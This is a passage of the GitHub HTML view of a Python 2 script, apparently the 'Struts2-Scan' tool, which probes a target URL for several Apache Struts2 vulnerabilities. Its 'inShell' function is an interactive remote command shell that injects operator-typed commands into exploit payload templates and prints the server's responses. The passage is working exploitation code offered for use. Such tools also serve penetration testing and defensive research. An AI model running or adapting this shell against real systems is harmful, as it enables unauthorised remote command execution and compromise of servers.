        <td id="LC124" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">self</span>.check(<span class="pl-s"><span class="pl-pds">&quot;</span>struts2-032<span class="pl-pds">&quot;</span></span>, req.text)</td>
      </tr>
      <tr>
        <td id="L125" class="blob-num js-line-number" data-line-number="125"></td>
        <td id="LC125" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L126" class="blob-num js-line-number" data-line-number="126"></td>
        <td id="LC126" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-032超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L127" class="blob-num js-line-number" data-line-number="127"></td>
        <td id="LC127" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L128" class="blob-num js-line-number" data-line-number="128"></td>
        <td id="LC128" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L129" class="blob-num js-line-number" data-line-number="129"></td>
        <td id="LC129" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.get(<span class="pl-c1">self</span>.url<span class="pl-k">+</span><span class="pl-c1">self</span>.poc[<span class="pl-s"><span class="pl-pds">&#39;</span>ST2-033<span class="pl-pds">&#39;</span></span>], <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L130" class="blob-num js-line-number" data-line-number="130"></td>
        <td id="LC130" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">self</span>.check(<span class="pl-s"><span class="pl-pds">&quot;</span>struts2-033<span class="pl-pds">&quot;</span></span>, req.text)</td>
      </tr>
      <tr>
        <td id="L131" class="blob-num js-line-number" data-line-number="131"></td>
        <td id="LC131" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L132" class="blob-num js-line-number" data-line-number="132"></td>
        <td id="LC132" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-033超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L133" class="blob-num js-line-number" data-line-number="133"></td>
        <td id="LC133" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L134" class="blob-num js-line-number" data-line-number="134"></td>
        <td id="LC134" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L135" class="blob-num js-line-number" data-line-number="135"></td>
        <td id="LC135" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.get(<span class="pl-c1">self</span>.url<span class="pl-k">+</span><span class="pl-c1">self</span>.poc[<span class="pl-s"><span class="pl-pds">&#39;</span>ST2-037<span class="pl-pds">&#39;</span></span>], <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L136" class="blob-num js-line-number" data-line-number="136"></td>
        <td id="LC136" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">self</span>.check(<span class="pl-s"><span class="pl-pds">&quot;</span>struts2-037<span class="pl-pds">&quot;</span></span>, req.text)</td>
      </tr>
      <tr>
        <td id="L137" class="blob-num js-line-number" data-line-number="137"></td>
        <td id="LC137" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L138" class="blob-num js-line-number" data-line-number="138"></td>
        <td id="LC138" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-037超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L139" class="blob-num js-line-number" data-line-number="139"></td>
        <td id="LC139" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L140" class="blob-num js-line-number" data-line-number="140"></td>
        <td id="LC140" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L141" class="blob-num js-line-number" data-line-number="141"></td>
        <td id="LC141" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.get(<span class="pl-c1">self</span>.url, <span class="pl-v">headers</span><span class="pl-k">=</span>headers2, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L142" class="blob-num js-line-number" data-line-number="142"></td>
        <td id="LC142" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">self</span>.check(<span class="pl-s"><span class="pl-pds">&quot;</span>struts2-045<span class="pl-pds">&quot;</span></span>, req.text)</td>
      </tr>
      <tr>
        <td id="L143" class="blob-num js-line-number" data-line-number="143"></td>
        <td id="LC143" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L144" class="blob-num js-line-number" data-line-number="144"></td>
        <td id="LC144" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-045超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L145" class="blob-num js-line-number" data-line-number="145"></td>
        <td id="LC145" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L146" class="blob-num js-line-number" data-line-number="146"></td>
        <td id="LC146" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L147" class="blob-num js-line-number" data-line-number="147"></td>
        <td id="LC147" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.post(<span class="pl-c1">self</span>.url, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">&quot;</span><span class="pl-pds">&quot;</span></span>, <span class="pl-v">headers</span><span class="pl-k">=</span>headers3, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L148" class="blob-num js-line-number" data-line-number="148"></td>
        <td id="LC148" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">self</span>.check(<span class="pl-s"><span class="pl-pds">&quot;</span>struts2-048<span class="pl-pds">&quot;</span></span>, req.text)</td>
      </tr>
      <tr>
        <td id="L149" class="blob-num js-line-number" data-line-number="149"></td>
        <td id="LC149" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L150" class="blob-num js-line-number" data-line-number="150"></td>
        <td id="LC150" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-048超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L151" class="blob-num js-line-number" data-line-number="151"></td>
        <td id="LC151" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L152" class="blob-num js-line-number" data-line-number="152"></td>
        <td id="LC152" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L153" class="blob-num js-line-number" data-line-number="153"></td>
        <td id="LC153" class="blob-code blob-code-inner js-file-line">            req1 <span class="pl-k">=</span> requests.get(<span class="pl-c1">self</span>.url<span class="pl-k">+</span><span class="pl-s"><span class="pl-pds">&quot;</span>?class[<span class="pl-c1">%27c</span>lassLoader%27][%27jarPath%27]=1<span class="pl-pds">&quot;</span></span>, <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L154" class="blob-num js-line-number" data-line-number="154"></td>
        <td id="LC154" class="blob-code blob-code-inner js-file-line">            req2 <span class="pl-k">=</span> requests.get(<span class="pl-c1">self</span>.url<span class="pl-k">+</span><span class="pl-s"><span class="pl-pds">&quot;</span>?class[<span class="pl-c1">%27c</span>lassLoader%27][<span class="pl-c1">%27r</span>esources%27]=1<span class="pl-pds">&quot;</span></span>, <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L155" class="blob-num js-line-number" data-line-number="155"></td>
        <td id="LC155" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> req1.status_code <span class="pl-k">==</span> <span class="pl-c1">200</span> <span class="pl-k">and</span> req2.status_code <span class="pl-k">==</span> <span class="pl-c1">404</span>:</td>
      </tr>
      <tr>
        <td id="L156" class="blob-num js-line-number" data-line-number="156"></td>
        <td id="LC156" class="blob-code blob-code-inner js-file-line">                cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>目标存在struts2-020漏洞..(只提供检测)<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L157" class="blob-num js-line-number" data-line-number="157"></td>
        <td id="LC157" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L158" class="blob-num js-line-number" data-line-number="158"></td>
        <td id="LC158" class="blob-code blob-code-inner js-file-line">                cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>目标不存在struts2-020漏洞..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>green<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L159" class="blob-num js-line-number" data-line-number="159"></td>
        <td id="LC159" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L160" class="blob-num js-line-number" data-line-number="160"></td>
        <td id="LC160" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-020超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L161" class="blob-num js-line-number" data-line-number="161"></td>
        <td id="LC161" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L162" class="blob-num js-line-number" data-line-number="162"></td>
        <td id="LC162" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L163" class="blob-num js-line-number" data-line-number="163"></td>
        <td id="LC163" class="blob-code blob-code-inner js-file-line">            req <span class="pl-k">=</span> requests.post(<span class="pl-c1">self</span>.url, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-c1">self</span>.poc[<span class="pl-s"><span class="pl-pds">&#39;</span>ST2-052<span class="pl-pds">&#39;</span></span>], <span class="pl-v">headers</span><span class="pl-k">=</span>headers_052, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L164" class="blob-num js-line-number" data-line-number="164"></td>
        <td id="LC164" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">if</span> req.status_code <span class="pl-k">==</span> <span class="pl-c1">500</span> <span class="pl-k">and</span> <span class="pl-sr"><span class="pl-k">r</span><span class="pl-pds">&quot;</span>java<span class="pl-c1">.</span>security<span class="pl-c1">.</span>Provider<span class="pl-c1">$</span>Service<span class="pl-pds">&quot;</span></span> <span class="pl-k">in</span> req.text:</td>
      </tr>
      <tr>
        <td id="L165" class="blob-num js-line-number" data-line-number="165"></td>
        <td id="LC165" class="blob-code blob-code-inner js-file-line">                cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>目标存在struts2-052漏洞..(需使用其他方式利用)<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L166" class="blob-num js-line-number" data-line-number="166"></td>
        <td id="LC166" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L167" class="blob-num js-line-number" data-line-number="167"></td>
        <td id="LC167" class="blob-code blob-code-inner js-file-line">                cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>目标不存在struts2-052漏洞..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>green<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L168" class="blob-num js-line-number" data-line-number="168"></td>
        <td id="LC168" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L169" class="blob-num js-line-number" data-line-number="169"></td>
        <td id="LC169" class="blob-code blob-code-inner js-file-line">            cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>检测struts2-052超时..<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L170" class="blob-num js-line-number" data-line-number="170"></td>
        <td id="LC170" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L171" class="blob-num js-line-number" data-line-number="171"></td>
        <td id="LC171" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">def</span> <span class="pl-en">inShell</span>(<span class="pl-smi"><span class="pl-smi">self</span></span>, <span class="pl-smi">pocname</span>):</td>
      </tr>
      <tr>
        <td id="L172" class="blob-num js-line-number" data-line-number="172"></td>
        <td id="LC172" class="blob-code blob-code-inner js-file-line">        cprint(<span class="pl-s"><span class="pl-pds">&#39;&#39;&#39;</span></span></td>
      </tr>
      <tr>
        <td id="L173" class="blob-num js-line-number" data-line-number="173"></td>
        <td id="LC173" class="blob-code blob-code-inner js-file-line"><span class="pl-s"> ____  _              _            ____                  </span></td>
      </tr>
      <tr>
        <td id="L174" class="blob-num js-line-number" data-line-number="174"></td>
        <td id="LC174" class="blob-code blob-code-inner js-file-line"><span class="pl-s">/ ___|| |_ _ __ _   _| |_ ___     / ___|  ___ __ _ _ __  </span></td>
      </tr>
      <tr>
        <td id="L175" class="blob-num js-line-number" data-line-number="175"></td>
        <td id="LC175" class="blob-code blob-code-inner js-file-line"><span class="pl-s">\___ \| __| &#39;__| | | | __/ __|____\___ \ / __/ _` | &#39;_ \ </span></td>
      </tr>
      <tr>
        <td id="L176" class="blob-num js-line-number" data-line-number="176"></td>
        <td id="LC176" class="blob-code blob-code-inner js-file-line"><span class="pl-s"> ___) | |_| |  | |_| | |_\__ \_____|__) | (_| (_| | | | |</span></td>
      </tr>
      <tr>
        <td id="L177" class="blob-num js-line-number" data-line-number="177"></td>
        <td id="LC177" class="blob-code blob-code-inner js-file-line"><span class="pl-s">|____/ \__|_|   \__,_|\__|___/    |____/ \___\__,_|_| |_|</span></td>
      </tr>
      <tr>
        <td id="L178" class="blob-num js-line-number" data-line-number="178"></td>
        <td id="LC178" class="blob-code blob-code-inner js-file-line"><span class="pl-s">                                        Code by Lucifer.</span></td>
      </tr>
      <tr>
        <td id="L179" class="blob-num js-line-number" data-line-number="179"></td>
        <td id="LC179" class="blob-code blob-code-inner js-file-line"><span class="pl-s">            <span class="pl-pds">&#39;&#39;&#39;</span></span>, <span class="pl-s"><span class="pl-pds">&#39;</span>cyan<span class="pl-pds">&#39;</span></span>)</td>
      </tr>
      <tr>
        <td id="L180" class="blob-num js-line-number" data-line-number="180"></td>
        <td id="LC180" class="blob-code blob-code-inner js-file-line">        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>-------struts2 交互式shell--------<span class="pl-cce">\n</span>目标url:<span class="pl-pds">&quot;</span></span><span class="pl-k">+</span><span class="pl-c1">self</span>.url, <span class="pl-s"><span class="pl-pds">&quot;</span>cyan<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L181" class="blob-num js-line-number" data-line-number="181"></td>
        <td id="LC181" class="blob-code blob-code-inner js-file-line">        prompt <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>shell &gt;&gt;<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="L182" class="blob-num js-line-number" data-line-number="182"></td>
        <td id="LC182" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L183" class="blob-num js-line-number" data-line-number="183"></td>
        <td id="LC183" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> pocname <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-005<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L184" class="blob-num js-line-number" data-line-number="184"></td>
        <td id="LC184" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> <span class="pl-c1">True</span>:</td>
      </tr>
      <tr>
        <td id="L185" class="blob-num js-line-number" data-line-number="185"></td>
        <td id="LC185" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">print</span> prompt,</td>
      </tr>
      <tr>
        <td id="L186" class="blob-num js-line-number" data-line-number="186"></td>
        <td id="LC186" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> <span class="pl-v">raw_input</span>()</td>
      </tr>
      <tr>
        <td id="L187" class="blob-num js-line-number" data-line-number="187"></td>
        <td id="LC187" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> command.strip()</td>
      </tr>
      <tr>
        <td id="L188" class="blob-num js-line-number" data-line-number="188"></td>
        <td id="LC188" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> command <span class="pl-k">!=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>exit<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L189" class="blob-num js-line-number" data-line-number="189"></td>
        <td id="LC189" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L190" class="blob-num js-line-number" data-line-number="190"></td>
        <td id="LC190" class="blob-code blob-code-inner js-file-line">                        commurl <span class="pl-k">=</span> <span class="pl-c1">self</span>.url</td>
      </tr>
      <tr>
        <td id="L191" class="blob-num js-line-number" data-line-number="191"></td>
        <td id="LC191" class="blob-code blob-code-inner js-file-line">                        req <span class="pl-k">=</span> requests.post(commurl, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-c1">self</span>.shell[<span class="pl-s"><span class="pl-pds">&#39;</span>struts2-005<span class="pl-pds">&#39;</span></span>].replace(<span class="pl-s"><span class="pl-pds">&quot;</span>FUZZINGCOMMAND<span class="pl-pds">&quot;</span></span>, command), <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L192" class="blob-num js-line-number" data-line-number="192"></td>
        <td id="LC192" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> req.text</td>
      </tr>
      <tr>
        <td id="L193" class="blob-num js-line-number" data-line-number="193"></td>
        <td id="LC193" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L194" class="blob-num js-line-number" data-line-number="194"></td>
        <td id="LC194" class="blob-code blob-code-inner js-file-line">                        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>命令执行失败!!!<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L195" class="blob-num js-line-number" data-line-number="195"></td>
        <td id="LC195" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L196" class="blob-num js-line-number" data-line-number="196"></td>
        <td id="LC196" class="blob-code blob-code-inner js-file-line">                    sys.exit(<span class="pl-c1">1</span>)</td>
      </tr>
      <tr>
        <td id="L197" class="blob-num js-line-number" data-line-number="197"></td>
        <td id="LC197" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L198" class="blob-num js-line-number" data-line-number="198"></td>
        <td id="LC198" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> pocname <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-009<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L199" class="blob-num js-line-number" data-line-number="199"></td>
        <td id="LC199" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> <span class="pl-c1">True</span>:</td>
      </tr>
      <tr>
        <td id="L200" class="blob-num js-line-number" data-line-number="200"></td>
        <td id="LC200" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">print</span> prompt,</td>
      </tr>
      <tr>
        <td id="L201" class="blob-num js-line-number" data-line-number="201"></td>
        <td id="LC201" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> <span class="pl-v">raw_input</span>()</td>
      </tr>
      <tr>
        <td id="L202" class="blob-num js-line-number" data-line-number="202"></td>
        <td id="LC202" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> command.strip()</td>
      </tr>
      <tr>
        <td id="L203" class="blob-num js-line-number" data-line-number="203"></td>
        <td id="LC203" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> command <span class="pl-k">!=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>exit<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L204" class="blob-num js-line-number" data-line-number="204"></td>
        <td id="LC204" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L205" class="blob-num js-line-number" data-line-number="205"></td>
        <td id="LC205" class="blob-code blob-code-inner js-file-line">                        commurl <span class="pl-k">=</span> <span class="pl-c1">self</span>.url</td>
      </tr>
      <tr>
        <td id="L206" class="blob-num js-line-number" data-line-number="206"></td>
        <td id="LC206" class="blob-code blob-code-inner js-file-line">                        req <span class="pl-k">=</span> requests.post(commurl, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-c1">self</span>.shell[<span class="pl-s"><span class="pl-pds">&#39;</span>struts2-009<span class="pl-pds">&#39;</span></span>].replace(<span class="pl-s"><span class="pl-pds">&quot;</span>FUZZINGCOMMAND<span class="pl-pds">&quot;</span></span>, command), <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L207" class="blob-num js-line-number" data-line-number="207"></td>
        <td id="LC207" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> req.text</td>
      </tr>
      <tr>
        <td id="L208" class="blob-num js-line-number" data-line-number="208"></td>
        <td id="LC208" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L209" class="blob-num js-line-number" data-line-number="209"></td>
        <td id="LC209" class="blob-code blob-code-inner js-file-line">                        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>命令执行失败!!!<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L210" class="blob-num js-line-number" data-line-number="210"></td>
        <td id="LC210" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L211" class="blob-num js-line-number" data-line-number="211"></td>
        <td id="LC211" class="blob-code blob-code-inner js-file-line">                    sys.exit(<span class="pl-c1">1</span>)</td>
      </tr>
      <tr>
        <td id="L212" class="blob-num js-line-number" data-line-number="212"></td>
        <td id="LC212" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L213" class="blob-num js-line-number" data-line-number="213"></td>
        <td id="LC213" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> pocname <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-013<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L214" class="blob-num js-line-number" data-line-number="214"></td>
        <td id="LC214" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> <span class="pl-c1">True</span>:</td>
      </tr>
      <tr>
        <td id="L215" class="blob-num js-line-number" data-line-number="215"></td>
        <td id="LC215" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">print</span> prompt,</td>
      </tr>
      <tr>
        <td id="L216" class="blob-num js-line-number" data-line-number="216"></td>
        <td id="LC216" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> <span class="pl-v">raw_input</span>()</td>
      </tr>
      <tr>
        <td id="L217" class="blob-num js-line-number" data-line-number="217"></td>
        <td id="LC217" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> command.strip()</td>
      </tr>
      <tr>
        <td id="L218" class="blob-num js-line-number" data-line-number="218"></td>
        <td id="LC218" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> command <span class="pl-k">!=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>exit<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L219" class="blob-num js-line-number" data-line-number="219"></td>
        <td id="LC219" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L220" class="blob-num js-line-number" data-line-number="220"></td>
        <td id="LC220" class="blob-code blob-code-inner js-file-line">                        commurl <span class="pl-k">=</span> <span class="pl-c1">self</span>.url</td>
      </tr>
      <tr>
        <td id="L221" class="blob-num js-line-number" data-line-number="221"></td>
        <td id="LC221" class="blob-code blob-code-inner js-file-line">                        req <span class="pl-k">=</span> requests.post(commurl, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-c1">self</span>.shell[<span class="pl-s"><span class="pl-pds">&#39;</span>struts2-013<span class="pl-pds">&#39;</span></span>].replace(<span class="pl-s"><span class="pl-pds">&quot;</span>FUZZINGCOMMAND<span class="pl-pds">&quot;</span></span>, command), <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L222" class="blob-num js-line-number" data-line-number="222"></td>
        <td id="LC222" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> req.text</td>
      </tr>
      <tr>
        <td id="L223" class="blob-num js-line-number" data-line-number="223"></td>
        <td id="LC223" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L224" class="blob-num js-line-number" data-line-number="224"></td>
        <td id="LC224" class="blob-code blob-code-inner js-file-line">                        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>命令执行失败!!!<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L225" class="blob-num js-line-number" data-line-number="225"></td>
        <td id="LC225" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L226" class="blob-num js-line-number" data-line-number="226"></td>
        <td id="LC226" class="blob-code blob-code-inner js-file-line">                    sys.exit(<span class="pl-c1">1</span>)</td>
      </tr>
      <tr>
        <td id="L227" class="blob-num js-line-number" data-line-number="227"></td>
        <td id="LC227" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L228" class="blob-num js-line-number" data-line-number="228"></td>
        <td id="LC228" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> pocname <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-016<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L229" class="blob-num js-line-number" data-line-number="229"></td>
        <td id="LC229" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> <span class="pl-c1">True</span>:</td>
      </tr>
      <tr>
        <td id="L230" class="blob-num js-line-number" data-line-number="230"></td>
        <td id="LC230" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">print</span> prompt,</td>
      </tr>
      <tr>
        <td id="L231" class="blob-num js-line-number" data-line-number="231"></td>
